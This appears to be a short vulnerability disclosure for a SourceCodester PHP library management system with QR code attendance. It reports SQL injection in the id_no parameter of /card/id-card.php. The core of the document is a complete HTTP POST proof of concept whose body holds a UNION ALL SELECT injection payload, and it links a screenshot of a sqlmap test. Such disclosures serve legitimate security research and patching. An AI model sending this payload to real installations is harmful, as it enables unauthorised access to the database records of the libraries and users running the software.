# Library Management System with QR code Attendance and Auto Generate Library Card - SQL injections



### Vendor Homepage: 

[https://www.sourcecodester.com](https://www.sourcecodester.com/)



### Software Link: 

https://www.sourcecodester.com/php/15434/library-management-system-qr-code-attendance-and-auto-generate-library-card.html





### /card/id-card.php

> `id_no`Parameters have SQL injection

**SQL injection POC**

```
POST /LMS/card/id-card.php HTTP/1.1
Host: 172.20.10.14
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Content-Length: 112
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Accept-Language: zh-CN,zh;q=0.9
Cache-Control: max-age=0
Content-Type: application/x-www-form-urlencoded
Cookie: PHPSESSID=8l03mutpmr44pg0gv96afbujmn
Origin: http://172.20.10.14
Referer: http://172.20.10.14/LMS/card/id-card.php
Upgrade-Insecure-Requests: 1
Accept-Encoding: gzip

id_no=' UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x716b707171,0x686a467041767a434e5574435a446348437562755059707141736f7047694178686e787163596d6e,0x717a6a7a71),NULL#&search=
```

**SQLMAP Test**

![image-20220804234643404](https://cdn.jsdelivr.net/gh/beytagh001/blog-img/image-20220804234643404.png)















